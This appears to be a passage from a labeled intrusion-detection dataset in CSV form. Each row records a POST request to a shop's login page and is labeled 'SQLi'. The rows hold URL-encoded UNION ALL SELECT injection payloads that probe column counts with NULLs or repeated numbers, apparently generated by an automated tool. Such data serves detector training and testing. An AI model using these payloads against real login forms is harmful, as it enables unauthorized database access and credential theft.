,id,method,path,query,label
4317,34317,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%2C%207260%23%20AND%20%27iROy%27%3D%27iROy&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4318,34318,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%2C%205830%23%20AND%20%27UTfW%27%3D%27UTfW&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4319,34319,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%2C%204636%23%20AND%20%27HfiG%27%3D%27HfiG&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4320,34320,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27NEpq%27%3D%27NEpq&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4321,34321,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27DRIt%27%3D%27DRIt&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4322,34322,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27LHHk%27%3D%27LHHk&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4323,34323,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27kjcm%27%3D%27kjcm&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4324,34324,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27IOps%27%3D%27IOps&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4325,34325,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27ZTkZ%27%3D%27ZTkZ&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4326,34326,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27DIUE%27%3D%27DIUE&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4327,34327,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27BKtI%27%3D%27BKtI&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4328,34328,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27zngO%27%3D%27zngO&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4329,34329,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27QAFb%27%3D%27QAFb&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4330,34330,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%2C%207576%23%20AND%20%27FUeH%27%3D%27FUeH&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4331,34331,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%2C%206459%23%20AND%20%27pMxf%27%3D%27pMxf&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4332,34332,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%2C%203565%23%20AND%20%27kDfz%27%3D%27kDfz&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4333,34333,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%2C%204708%23%20AND%20%27aHjy%27%3D%27aHjy&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4334,34334,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%2C%204272%23%20AND%20%27oPuE%27%3D%27oPuE&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4335,34335,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%2C%202272%23%20AND%20%27BOQa%27%3D%27BOQa&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4336,34336,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%2C%204435%23%20AND%20%27WsrP%27%3D%27WsrP&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4337,34337,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%2C%206508%23%20AND%20%27dyyF%27%3D%27dyyF&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4338,34338,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%2C%201572%23%20AND%20%27BlgQ%27%3D%27BlgQ&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4339,34339,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%2C%20214%23%20AND%20%27aubX%27%3D%27aubX&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4340,34340,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL--%20%20AND%20%27Moip%27%3D%27Moip&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4341,34341,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL--%20%20AND%20%27HNRa%27%3D%27HNRa&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4342,34342,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27iHEq%27%3D%27iHEq&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4343,34343,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27rTHn%27%3D%27rTHn&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4344,34344,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27HWDE%27%3D%27HWDE&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4345,34345,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27KlOx%27%3D%27KlOx&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4346,34346,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27swii%27%3D%27swii&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4347,34347,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27sYrD%27%3D%27sYrD&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4348,34348,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27EbHW%27%3D%27EbHW&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4349,34349,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27VJvM%27%3D%27VJvM&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4350,34350,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%207341--%20%20AND%20%27dIwP%27%3D%27dIwP&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4351,34351,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%205326%2C%205326--%20%20AND%20%27uEtO%27%3D%27uEtO&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4352,34352,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%207559%2C%207559%2C%207559--%20%20AND%20%27IJBD%27%3D%27IJBD&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4353,34353,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%202769%2C%202769%2C%202769%2C%202769--%20%20AND%20%27CqBe%27%3D%27CqBe&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4354,34354,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%202009%2C%202009%2C%202009%2C%202009%2C%202009--%20%20AND%20%27AKpu%27%3D%27AKpu&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4355,34355,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%202756%2C%202756%2C%202756%2C%202756%2C%202756%2C%202756--%20%20AND%20%27Oeku%27%3D%27Oeku&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4356,34356,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20453%2C%20453%2C%20453%2C%20453%2C%20453%2C%20453%2C%20453--%20%20AND%20%27czzX%27%3D%27czzX&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4357,34357,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%206736%2C%206736%2C%206736%2C%206736%2C%206736%2C%206736%2C%206736%2C%206736--%20%20AND%20%27gjwT%27%3D%27gjwT&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4358,34358,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20237%2C%20237%2C%20237%2C%20237%2C%20237%2C%20237%2C%20237%2C%20237%2C%20237--%20%20AND%20%27pKAq%27%3D%27pKAq&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4359,34359,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%204021%2C%204021%2C%204021%2C%204021%2C%204021%2C%204021%2C%204021%2C%204021%2C%204021%2C%204021--%20%20AND%20%27vCCt%27%3D%27vCCt&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4360,34360,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27TPsX%27%3D%27TPsX&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4361,34361,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27OVxx%27%3D%27OVxx&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4362,34362,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27Ztnv%27%3D%27Ztnv&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4363,34363,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27JlxZ%27%3D%27JlxZ&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4364,34364,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27YBTM%27%3D%27YBTM&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4365,34365,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27kUJG%27%3D%27kUJG&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4366,34366,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27GFiH%27%3D%27GFiH&pwd=FrAmE30.&remember=&modo=entrar,SQLi
